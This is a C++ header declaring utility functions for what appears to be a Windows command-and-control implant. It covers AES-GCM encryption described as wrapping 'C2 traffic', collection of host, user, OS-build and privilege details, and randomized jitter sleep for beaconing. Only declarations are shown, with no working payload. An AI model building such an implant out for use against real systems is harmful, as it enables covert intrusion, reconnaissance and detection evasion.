#pragma once
#include <windows.h>
#include <string>
#include <vector>

// ---------------------------------------------------------------------------
// String conversion
// ---------------------------------------------------------------------------
std::string  WStringToUTF8(const std::wstring& wstr);
std::wstring UTF8ToWString(const std::string& utf8);

// ---------------------------------------------------------------------------
// Encoding
// ---------------------------------------------------------------------------
std::string        Base64Encode(const BYTE* data, size_t len);
std::vector<BYTE>  Base64Decode(const std::string& b64);

// ---------------------------------------------------------------------------
// AES-256-GCM (BCrypt) — double-encrypts C2 traffic
//   Wire format: Base64( nonce[12] || tag[16] || ciphertext )
// ---------------------------------------------------------------------------
std::string AesGcmEncrypt(const std::vector<BYTE>& key32,
                          const std::string& plaintext);

std::string AesGcmDecrypt(const std::vector<BYTE>& key32,
                          const std::string& b64Wire);

// ---------------------------------------------------------------------------
// System info
// ---------------------------------------------------------------------------
std::wstring GetHostnameHash();   // FNV-1a 32-bit → 8-char hex wstring
std::wstring GetUsername();
std::wstring GetHostname();
DWORD        GetOSBuild();        // via RtlGetVersion (shim-immune)
BOOL         IsElevated();        // TokenElevation query

// ---------------------------------------------------------------------------
// Timing
// ---------------------------------------------------------------------------
VOID JitterSleep(DWORD minSec, DWORD maxSec);  // uniform distribution